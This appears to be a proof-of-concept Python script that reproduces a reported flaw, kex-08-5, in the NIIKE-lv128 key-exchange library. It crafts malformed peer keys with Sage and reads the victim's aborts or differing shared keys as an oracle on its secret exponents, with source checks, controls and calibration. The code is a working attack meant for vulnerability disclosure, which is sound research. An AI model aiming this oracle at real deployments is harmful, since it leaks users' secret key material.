#!/usr/bin/env python3
"""Reproduce kex-08-5: a malformed NIIKE-lv128 peer key gives a reaction
oracle on the victim's static secret exponents.

The attacker is the peer B. It sends its honest public key with, in each of
the 13 cycle tuples, P_s replaced by P_s + T, where T is the point of order d
in <Q_s>. When d = l_j^m, the victim's kex_derive_ss_a aborts (submitted
assert build) or returns a different key (NDEBUG build) exactly when the
victim's exponent s_j < m. Otherwise it returns byte-for-byte the honest key,
which B can compute itself.

Default: one naturally generated victim against the submitted
kex-08/lib/libNIIKE-lv128.so, all 31 p+1 primes (d = l_j), the 3^4
coordinate at d = 9, 27, 81 and the 11^2 coordinate at d = 121, plus a
threshold calibration on chosen exponent vectors. NGCC_LONG=1 adds three more
natural victims and repeats everything on an NDEBUG build made in a temporary
directory. Sage is needed only to craft the peer keys (exit 77 without it).
No secret-key recovery is attempted.
"""

import concurrent.futures as cf
import ctypes
import os
import shlex
import shutil
import struct
import subprocess
import sys
import tempfile
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
CAND = ROOT / "kex-08"
LIB = CAND / "lib/libNIIKE-lv128.so"
REF = CAND / "Implementations and Test_Vectors/Implementations/Reference_Implementation"
U = ctypes.c_ulonglong
NEXP = 49          # lv128 secret: 49 int32 exponents (31 p+1 primes, 18 p-1 primes)
NPLUS = 31
VICTIM_SEED = bytes([0x12]) * 48
EXTRA_VICTIMS = [bytes([b]) * 48 for b in (0x10, 0x11, 0x13)]
PEER_SEED = bytes([0x77]) * 48

SAGE_CRAFT = r'''
import sys
from sage.all import GF, PolynomialRing, EllipticCurve
p = 0x53d1c0debdc0c1ba3edd760148d21a078008f642a9f26f65995c4d86fc6efff7
Fp = GF(p); x = PolynomialRing(Fp, 'x').gen()
F = GF(p**2, 'i', modulus=x**2 + 1); i = F.gen()
FP2, T, E = 64, 13, 5
def dec(b):
    return F(Fp(int.from_bytes(b[:32], 'little'))) + F(Fp(int.from_bytes(b[32:], 'little'))) * i
def enc(a):
    c = a.polynomial().list() + [0, 0]
    return int(c[0]).to_bytes(32, 'little') + int(c[1]).to_bytes(32, 'little')
pk = open(sys.argv[1], 'rb').read()
outdir = sys.argv[2]
orders = [int(v) for v in sys.argv[3].split(',')]
raw = [pk[k*FP2:(k+1)*FP2] for k in range(T*E)]
el = [dec(b) for b in raw]
assert all(enc(el[k]) == raw[k] for k in range(T*E)), 'non-canonical honest key'
pts = []
for k in range(T):
    a24, Ps, Pt, Qs, Qt = el[k*E:(k+1)*E]
    Ec = EllipticCurve(F, [0, 4*a24 - 2, 0, 1, 0])
    P, Q = Ec.lift_x(Ps), Ec.lift_x(Qs)
    o = P.order()
    assert Q.order() == o and (p + 1) % o == 0
    pts.append((P, Q, o))
for d in orders:
    assert (p + 1) % d == 0
    out = list(raw)
    for k, (P, Q, o) in enumerate(pts):
        assert o % d == 0
        Td = (o // d) * Q
        assert Td.order() == d
        out[k*E + 1] = enc((P + Td).xy()[0])
    open('%s/d%d.pk' % (outdir, d), 'wb').write(b''.join(out))
print('crafted', len(orders))
'''


def load(path):
    lib = ctypes.CDLL(str(path), mode=ctypes.RTLD_LOCAL)
    for name in ("kex_get_pk_len_bytes", "kex_get_sk_len_bytes", "kex_get_ss_len_bytes"):
        getattr(lib, name).restype = U
    return lib


def child_keygen(lib_path, seed_hex, prefix):
    lib = load(lib_path)
    npk, nsk = lib.kex_get_pk_len_bytes(), lib.kex_get_sk_len_bytes()
    seed = bytes.fromhex(seed_hex)
    lib.ngcc_seed(seed, U(len(seed)))
    pk, sk, st = (ctypes.create_string_buffer(n + 64) for n in (npk, nsk, 64))
    a, b, c = U(0), U(0), U(0)
    rc = lib.kex_init_a(pk, ctypes.byref(a), sk, ctypes.byref(b), st, ctypes.byref(c))
    if rc != 0:
        raise SystemExit(f"keygen rc={rc}")
    Path(prefix + ".pk").write_bytes(pk.raw[:npk])
    Path(prefix + ".sk").write_bytes(sk.raw[:nsk])


def child_derive(lib_path, skf, pkf):
    lib = load(lib_path)
    sk, pk = Path(skf).read_bytes(), Path(pkf).read_bytes()
    nss = lib.kex_get_ss_len_bytes()
    ss, sl = ctypes.create_string_buffer(nss + 64), U(nss)
    rc = lib.kex_derive_ss_a(ctypes.create_string_buffer(sk, len(sk) + 64), U(len(sk)),
                             ctypes.create_string_buffer(pk, len(pk) + 64), U(len(pk)),
                             None, U(0), None, U(0), ss, ctypes.byref(sl))
    print(f"rc={rc} ss={ss.raw[:nss].hex()}")


def spawn(args, timeout=900):
    return subprocess.run([sys.executable, "-I", str(Path(__file__).resolve())] + args,
                          capture_output=True, text=True, timeout=timeout)


def run_derives(lib_path, jobs):
    """jobs: {name: (skfile, pkfile)} -> {name: ('ok', key) | ('abort', signal/rc)}"""
    def one(item):
        name, (skf, pkf) = item
        r = spawn(["--derive", str(lib_path), str(skf), str(pkf)])
        if r.returncode == 0 and r.stdout.startswith("rc=0 ss="):
            return name, ("ok", r.stdout.split("ss=")[1].strip())
        return name, ("abort", r.returncode)
    with cf.ThreadPoolExecutor(max(1, os.cpu_count() or 1)) as ex:
        return dict(ex.map(one, jobs.items()))


def find_sage():
    cands = []
    for var in ("NIIKE_PYTHON", "NGCC_SAGE_PYTHON"):
        if os.environ.get(var):
            cands.append(shlex.split(os.environ[var]))
    cands.append(["python3"])
    if shutil.which("sage"):
        cands.append(["sage", "-python"])
    if shutil.which("mamba"):
        try:
            r = subprocess.run(["mamba", "run", "-n", "sage", "python", "-c",
                                "import sys; print(sys.executable)"],
                               capture_output=True, text=True, timeout=300)
            if r.returncode == 0 and r.stdout.strip():
                cands.append([r.stdout.strip().splitlines()[-1]])
        except (OSError, subprocess.TimeoutExpired):
            pass
    for c in cands:
        try:
            r = subprocess.run(c + ["-c", "import sage.all"], capture_output=True, timeout=300)
            if r.returncode == 0:
                return c
        except (OSError, subprocess.TimeoutExpired):
            continue
    return None


def sk_vec(path):
    return list(struct.unpack(f"<{NEXP}i", Path(path).read_bytes()[:4 * NEXP]))


def build_ndebug(tmp):
    """Build libNIIKE-lv128.so with -DNDEBUG from cp -rL copies (never in-tree)."""
    if not (shutil.which("make") and shutil.which("gcc")):
        return None
    tree = Path(tmp) / "tree"
    shutil.copytree(ROOT / "api", tree / "api", symlinks=False)
    dst = tree / "kex-08" / REF.relative_to(CAND)
    shutil.copytree(REF, dst, symlinks=False)
    shutil.copy2(CAND / "Makefile", tree / "kex-08" / "Makefile")
    r = subprocess.run(["make", "-s", "-C", str(tree / "kex-08"), "-j8",
                        "lib/libNIIKE-lv128.so", "CFLAGS_NIIKE-lv128=-DNDEBUG", "CC=gcc"],
                       capture_output=True, text=True)
    lib = tree / "kex-08/lib/libNIIKE-lv128.so"
    if r.returncode != 0 or not lib.is_file():
        print(r.stdout[-2000:], r.stderr[-2000:])
        return None
    return lib


def react(res, honest):
    return not (res[0] == "ok" and res[1] == honest)


def check_victim(lib_path, tag, skf, keys, primes, tmp, ndebug):
    """Natural victim: one query per prime l_j (d=l_j), plus d=9,27,81 and 121."""
    s = sk_vec(skf)
    jobs = {"honest": (skf, keys["B.pk"])}
    probes = [(j, 1, primes[j]) for j in range(NPLUS)] + [(0, 2, 9), (0, 3, 27), (0, 4, 81), (3, 2, 121)]
    for j, m, d in probes:
        jobs[f"d{d}"] = (skf, keys[f"d{d}"])
    res = run_derives(lib_path, jobs)
    honest = res["honest"]
    if honest[0] != "ok":
        print(f"NOT CONFIRMED kex-08-5: {tag} honest derive failed {honest}")
        return None
    ok, n, reacted = True, 0, []
    for j, m, d in probes:
        r = res[f"d{d}"]
        got = react(r, honest[1])
        want = s[j] < m
        n += 1
        ok &= got == want
        if ndebug and got:
            ok &= r[0] == "ok"   # NDEBUG: silent different key, not an abort
        if got:
            reacted.append((j, m, d, f"exit {r[1]}" if r[0] == "abort" else "rc=0 different key", ""))
    zeros = [j for j in range(NPLUS) if s[j] == 0]
    print(f"  {tag}: s_0={s[0]} s_3={s[3]} zero p+1 exponents at j={zeros}; "
          f"reactions at {[(j, d, how) for j, m, d, how, _ in reacted]}; {n} predictions "
          f"{'all correct' if ok else 'MISMATCH'}")
    return ok, n


def calibrate(lib_path, base_skf, keys, primes, tmp, ndebug):
    """Chosen exponent vectors: s_0 in 0..4 against d=3,9,27,81 and s_3 in 0..2 against d=11,121."""
    base = sk_vec(base_skf)
    rest = Path(base_skf).read_bytes()[4 * NEXP:]
    cases = [(0, v, [(1, 3), (2, 9), (3, 27), (4, 81)]) for v in range(5)] + \
            [(3, v, [(1, 11), (2, 121)]) for v in range(3)]
    jobs, meta = {}, []
    for idx, v, plist in cases:
        s = list(base); s[idx] = v
        skf = Path(tmp) / f"cal_{idx}_{v}.sk"
        skf.write_bytes(struct.pack(f"<{NEXP}i", *s) + rest)
        jobs[f"h_{idx}_{v}"] = (skf, keys["B.pk"])
        for m, d in plist:
            jobs[f"p_{idx}_{v}_{d}"] = (skf, keys[f"d{d}"])
            meta.append((idx, v, m, d))
    res = run_derives(lib_path, jobs)
    ok, n, table = True, 0, {}
    for idx, v, m, d in meta:
        h = res[f"h_{idx}_{v}"]
        if h[0] != "ok":
            return False, 0
        got = react(res[f"p_{idx}_{v}_{d}"], h[1])
        ok &= got == (v < m)
        n += 1
        table.setdefault((idx, d), []).append(v if got else None)
    for (idx, d), vals in sorted(table.items()):
        hit = [v for v in vals if v is not None]
        print(f"  calibration l^m={d:3d} on s_{idx}: reacts for s_{idx} in {hit}")
    return ok, n


def run_all(lib_path, label, victims, keys, primes, tmp, ndebug):
    print(f"[{label}] {lib_path}")
    total, good = 0, True
    for k, (tag, skf) in enumerate(victims):
        r = check_victim(lib_path, tag, skf, keys, primes, tmp, ndebug)
        if r is None:
            return False, 0
        good &= r[0]; total += r[1]
    ok, n = calibrate(lib_path, victims[0][1], keys, primes, tmp, ndebug)
    good &= ok; total += n
    return good, total


def main():
    if len(sys.argv) >= 2 and sys.argv[1] == "--keygen":
        child_keygen(*sys.argv[2:5]); return 0
    if len(sys.argv) >= 2 and sys.argv[1] == "--derive":
        child_derive(*sys.argv[2:5]); return 0

    t0 = time.time()
    long_run = os.environ.get("NGCC_LONG") == "1"
    if not LIB.is_file():
        print(f"SKIP kex-08-5: build {LIB.name} with make -C kex-08"); return 77
    sage = find_sage()
    if sage is None:
        print("SKIP kex-08-5: no Python with sage.all (set NIIKE_PYTHON)"); return 77

    # Source certificate: the only consistency check is debug-only, and no
    # peer-key validation precedes the secret-dependent walk.
    proto = (REF / "protocols/bundleprotocols.c").read_text(errors="replace")
    api = (REF / "ngccapi/KEX_AlgorithmInstance.c").read_text(errors="replace")
    guard = proto.split("#ifndef NDEBUG", 1)
    if len(guard) != 2 or "assert(fp2_is_equal(&j0, &j1));" not in guard[1].split("#endif", 1)[0]:
        print("NOT CONFIRMED kex-08-5: debug-only j-invariant check not found"); return 1
    if "compare_gt(t, s[i])" not in proto:
        print("NOT CONFIRMED kex-08-5: secret-dependent step selection not found"); return 1
    derive_a = api.split("int kex_derive_ss_a(", 1)[1].split("int kex_derive_ss_b(", 1)[0]
    if "decode_bundlevertex(&pubkey, pkb);" not in derive_a or "valid" in derive_a.lower():
        print("NOT CONFIRMED kex-08-5: unexpected peer-key handling in kex_derive_ss_a"); return 1
    tc = (REF / "NIIKE-lv128/precomp/torsion_constants.c").read_text(errors="replace")
    import re
    arrs = {n: [int(v) for v in re.findall(n + r"\[\d+\]\s*=\s*\{([^}]*)\}", tc)[-1].split(",")]
            for n in ("TORSION_ODD_PRIMES", "TORSION_ODD_POWERS")}
    primes, powers = arrs["TORSION_ODD_PRIMES"], arrs["TORSION_ODD_POWERS"]
    if len(primes) != NEXP or powers[0] != 4 or powers[3] != 2 or primes[0] != 3 or primes[3] != 11:
        print("NOT CONFIRMED kex-08-5: unexpected lv128 torsion constants"); return 1
    print("source: no peer-key validation in kex_derive_ss_a; the j-invariant consistency "
          "check is assert-only under #ifndef NDEBUG (protocols/bundleprotocols.c)")

    with tempfile.TemporaryDirectory(prefix="ngcc-kex-08-5.") as tmp:
        seeds = [("B", PEER_SEED), ("A", VICTIM_SEED)]
        if long_run:
            seeds += [(f"A{k}", s) for k, s in enumerate(EXTRA_VICTIMS, 1)]

        def kg(item):
            tag, seed = item
            r = spawn(["--keygen", str(LIB), seed.hex(), f"{tmp}/{tag}"])
            return tag, r.returncode
        with cf.ThreadPoolExecutor(len(seeds)) as ex:
            for tag, rc in ex.map(kg, seeds):
                if rc != 0:
                    print(f"NOT CONFIRMED kex-08-5: keygen {tag} failed rc={rc}"); return 1

        orders = sorted(set(primes[:NPLUS] + [9, 27, 81, 121]))
        r = subprocess.run(sage + ["-c", SAGE_CRAFT, f"{tmp}/B.pk", tmp, ",".join(map(str, orders))],
                           capture_output=True, text=True, timeout=1200)
        if r.returncode != 0:
            print(r.stdout[-2000:], r.stderr[-2000:])
            print("NOT CONFIRMED kex-08-5: Sage key crafting failed"); return 1
        keys = {"B.pk": Path(f"{tmp}/B.pk")}
        keys.update({f"d{d}": Path(f"{tmp}/d{d}.pk") for d in orders})
        print(f"crafted {len(orders)} malformed peer keys from honest pk_B with Sage")

        # Control: honest agreement between A and B in both directions.
        ctl = run_derives(LIB, {"AB": (f"{tmp}/A.sk", f"{tmp}/B.pk"),
                                "BA": (f"{tmp}/B.sk", f"{tmp}/A.pk")})
        if not (ctl["AB"][0] == ctl["BA"][0] == "ok" and ctl["AB"][1] == ctl["BA"][1]):
            print(f"NOT CONFIRMED kex-08-5: honest agreement control failed {ctl}"); return 1
        print(f"control: honest agreement A<->B ok, key {ctl['AB'][1][:24]}...")

        victims = [("A", f"{tmp}/A.sk")] + ([(f"A{k}", f"{tmp}/A{k}.sk") for k in (1, 2, 3)] if long_run else [])
        good, total = run_all(LIB, "submitted assert build", victims, keys, primes, tmp, False)
        if long_run and good:
            nd = build_ndebug(tmp)
            if nd is None:
                print("NOT CONFIRMED kex-08-5: NDEBUG build failed"); return 1
            g2, t2 = run_all(nd, "NDEBUG build", victims, keys, primes, tmp, True)
            good &= g2; total += t2

    if not good:
        print(f"NOT CONFIRMED kex-08-5: reaction did not match the exponent predicate ({time.time() - t0:.0f} s)")
        return 1
    print(f"CONFIRMED kex-08-5: NIIKE-lv128 malformed peer keys reveal [s_j < m] on static exponents; "
          f"{total}/{total} predictions correct, non-reacting queries return the honest key "
          f"({time.time() - t0:.0f} s{', long run' if long_run else ''})")
    return 0


if __name__ == "__main__":
    sys.exit(main())
